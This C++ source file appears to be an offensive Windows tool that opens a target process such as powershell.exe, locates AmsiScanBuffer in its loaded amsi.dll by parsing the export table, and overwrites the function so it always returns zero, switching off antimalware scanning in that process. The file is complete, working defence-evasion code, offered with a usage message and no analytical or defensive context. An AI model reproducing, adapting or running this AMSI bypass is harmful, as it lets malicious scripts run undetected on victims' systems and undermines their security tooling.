#include <windows.h>
#include <iostream>
#include <string>
#include <TlHelp32.h>
#include <psapi.h>
#include <algorithm>

namespace evilbyte {

    struct Pe {
        HMODULE ImageBase;
        PIMAGE_DOS_HEADER DosHeader;
        PIMAGE_NT_HEADERS NtHeaders;
        IMAGE_OPTIONAL_HEADER OptionalHeader;
        IMAGE_FILE_HEADER FileHeader;
        PIMAGE_IMPORT_DESCRIPTOR ImportDescriptor;
        PIMAGE_EXPORT_DIRECTORY ExportDirectory;
    };

    Pe ParseRemotePe(HANDLE hProcess, LPCWSTR moduleName) {
        Pe pe = { 0 };
        HMODULE hModules[1024];
        DWORD cbNeeded;

        if (!EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) return pe;

        HMODULE targetModule = NULL;
        wchar_t modulePath[MAX_PATH];

        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            if (GetModuleFileNameExW(hProcess, hModules[i], modulePath, MAX_PATH)) {
                wchar_t* fileName = wcsrchr(modulePath, L'\\');
                if (fileName && _wcsicmp(fileName + 1, moduleName) == 0) {
                    targetModule = hModules[i];
                    break;
                }
            }
        }

        if (!targetModule) return pe;

        MODULEINFO moduleInfo;
        if (!GetModuleInformation(hProcess, targetModule, &moduleInfo, sizeof(moduleInfo))) return pe;

        pe.ImageBase = targetModule;

        IMAGE_DOS_HEADER dosHeader;
        if (!ReadProcessMemory(hProcess, targetModule, &dosHeader, sizeof(IMAGE_DOS_HEADER), NULL)) return pe;
        pe.DosHeader = (PIMAGE_DOS_HEADER)targetModule;

        IMAGE_NT_HEADERS ntHeaders;
        if (!ReadProcessMemory(hProcess, (BYTE*)targetModule + dosHeader.e_lfanew, &ntHeaders, sizeof(IMAGE_NT_HEADERS), NULL)) return pe;
        pe.NtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetModule + dosHeader.e_lfanew);
        pe.OptionalHeader = ntHeaders.OptionalHeader;
        pe.FileHeader = ntHeaders.FileHeader;

        pe.ImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD_PTR)targetModule + ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        pe.ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)targetModule + ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        return pe;
    }

    DWORD GetProcessIdByName(const std::wstring& processName) {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) return 0;

        PROCESSENTRY32W processEntry = { sizeof(PROCESSENTRY32W) };
        if (Process32FirstW(snapshot, &processEntry)) {
            do {
                if (_wcsicmp(processEntry.szExeFile, processName.c_str()) == 0) {
                    CloseHandle(snapshot);
                    return processEntry.th32ProcessID;
                }
            } while (Process32NextW(snapshot, &processEntry));
        }

        CloseHandle(snapshot);
        return 0;
    }

    bool PatchAmsiScanBuffer(HANDLE hProcess, const Pe& amsiPe) {
        IMAGE_EXPORT_DIRECTORY exportDir;
        if (!ReadProcessMemory(hProcess, amsiPe.ExportDirectory, &exportDir, sizeof(IMAGE_EXPORT_DIRECTORY), NULL)) return false;

        DWORD* addressOfFunctions = new DWORD[exportDir.NumberOfFunctions];
        DWORD* addressOfNames = new DWORD[exportDir.NumberOfNames];
        WORD* addressOfNameOrdinals = new WORD[exportDir.NumberOfNames];

        bool success = false;
        do {
            if (!ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)amsiPe.ImageBase + exportDir.AddressOfFunctions),
                addressOfFunctions, exportDir.NumberOfFunctions * sizeof(DWORD), NULL)) break;

            if (!ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)amsiPe.ImageBase + exportDir.AddressOfNames),
                addressOfNames, exportDir.NumberOfNames * sizeof(DWORD), NULL)) break;

            if (!ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)amsiPe.ImageBase + exportDir.AddressOfNameOrdinals),
                addressOfNameOrdinals, exportDir.NumberOfNames * sizeof(WORD), NULL)) break;

            DWORD_PTR amsiScanBufferRVA = 0;
            for (DWORD i = 0; i < exportDir.NumberOfNames; i++) {
                char functionName[256] = { 0 };
                if (!ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)amsiPe.ImageBase + addressOfNames[i]),
                    functionName, sizeof(functionName) - 1, NULL)) continue;

                if (strcmp(functionName, "AmsiScanBuffer") == 0) {
                    WORD ordinal = addressOfNameOrdinals[i];
                    amsiScanBufferRVA = addressOfFunctions[ordinal];
                    break;
                }
            }

            if (amsiScanBufferRVA == 0) break;

            LPVOID amsiScanBufferAddr = (LPVOID)((DWORD_PTR)amsiPe.ImageBase + amsiScanBufferRVA);
            std::cout << "AmsiScanBuffer: 0x" << std::hex << amsiScanBufferAddr << std::dec << std::endl;

            unsigned char patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };

            DWORD oldProtect;
            if (!VirtualProtectEx(hProcess, amsiScanBufferAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) break;

            if (!WriteProcessMemory(hProcess, amsiScanBufferAddr, patch, sizeof(patch), NULL)) {
                VirtualProtectEx(hProcess, amsiScanBufferAddr, sizeof(patch), oldProtect, &oldProtect);
                break;
            }

            VirtualProtectEx(hProcess, amsiScanBufferAddr, sizeof(patch), oldProtect, &oldProtect);
            success = true;
        } while (false);

        delete[] addressOfFunctions;
        delete[] addressOfNames;
        delete[] addressOfNameOrdinals;

        return success;
    }

    void DisplayUsage() {
        std::cout << "Usage: AMSI-PeParse-Patch.exe <process_name_or_pid>" << std::endl;
        std::cout << "  process_name_or_pid: Target process name (e.g., powershell.exe) or process ID" << std::endl;
    }

}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        evilbyte::DisplayUsage();
        return 1;
    }

    std::string input = argv[1];
    DWORD pid = std::all_of(input.begin(), input.end(), ::isdigit)
        ? std::stoul(input)
        : evilbyte::GetProcessIdByName(std::wstring(input.begin(), input.end()));

    if (pid == 0) {
        std::cerr << "Process '" << input << "' not found" << std::endl;
        return 1;
    }

    std::cout << "Target process ID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    auto amsi = evilbyte::ParseRemotePe(hProcess, L"amsi.dll");
    if (!amsi.ImageBase) {
        std::cerr << "Failed to parse amsi.dll" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Found amsi.dll at: 0x" << std::hex << amsi.ImageBase << std::dec << std::endl;

    if (evilbyte::PatchAmsiScanBuffer(hProcess, amsi))
        std::cout << "AMSI patched successfully in PID " << pid << std::endl;
    else
        std::cerr << "Failed to patch AMSI in PID " << pid << std::endl;

    CloseHandle(hProcess);
    return 0;
}